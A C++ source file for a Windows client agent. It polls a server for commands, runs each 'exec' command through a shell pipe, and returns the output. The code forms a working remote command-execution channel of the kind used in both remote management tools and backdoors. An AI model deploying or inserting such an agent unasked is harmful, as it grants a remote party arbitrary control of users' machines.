#include "commands.h"
#include "client.h"
#include <windows.h>
#include <sstream>
#include <iostream>
#include <vector>
#include <regex>
#include <cstdio>

std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
    std::vector<CommandInfo> cmds;
    std::string endpoint = "/api/clients/" + cfg.clientID + "/commands";
    std::string resp;
    if (!httpGet(cfg, endpoint, resp)) return cmds;
    std::regex re(R"("id"\s*:\s*"([^"]+)"[^}]*"type"\s*:\s*"([^"]+)")");
    auto begin = std::sregex_iterator(resp.begin(), resp.end(), re);
    auto end = std::sregex_iterator();
    for (auto i = begin; i != end; ++i) {
        std::smatch m = *i;
        CommandInfo ci;
        ci.id = m[1];
        ci.type = m[2];
        ci.command = "";
        if (ci.type == "exec") {
            std::regex cmdRe(R"("command"\s*:\s*"([^"]*)")");
            std::smatch cmdM;
            std::string remaining = resp.substr(m.position());
            if (std::regex_search(remaining, cmdM, cmdRe)) {
                ci.command = cmdM[1];
            }
        }
        cmds.push_back(ci);
    }
    return cmds;
}

bool ackCommand(const Config& cfg, const std::string& command_id) {
    std::string endpoint = "/api/commands/ack";
    std::ostringstream oss;
    oss << "{\"command_id\":\"" << command_id << "\"}";
    std::string resp;
    return httpPost(cfg, endpoint, oss.str(), resp);
}

bool sendCommandResult(const Config& cfg, const std::string& command_id, const std::string& result, const std::string& error) {
    std::string endpoint = "/api/commands/result";
    std::ostringstream oss;
    oss << "{\"command_id\":\"" << command_id << "\","
        << "\"result\":" << (result.empty() ? "null" : "\"" + escapeJson(result) + "\"") << ","
        << "\"error\":\"" << escapeJson(error) << "\"}";
    std::string resp;
    return httpPost(cfg, endpoint, oss.str(), resp);
}

static std::string execCommandCapture(const std::string& cmd) {
    std::string output;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "";
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        output += buffer;
    }
    _pclose(pipe);
    return output;
}

void processCommands(const Config& cfg) {
    auto cmds = fetchPendingCommands(cfg);
    for (const auto& cmd : cmds) {
        ackCommand(cfg, cmd.id);
        std::string result;
        std::string error;
        if (cmd.type == "exec") {
            result = execCommandCapture(cmd.command);
        } else {
            error = "Unsupported command type: " + cmd.type;
        }
        sendCommandResult(cfg, cmd.id, result, error);
    }
}

std::string escapeJson(const std::string& s) {
    std::ostringstream o; for (auto c: s) {
        switch (c) {
            case '\\': o << "\\\\"; break;
            case '"': o << "\\\""; break;
            case '\n': o << "\\n"; break;
            case '\r': o << "\\r"; break;
            case '\t': o << "\\t"; break;
            default:
                if (static_cast<unsigned char>(c) < 0x20) {
                    o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
                } else o << c;
        }
    } return o.str();
}
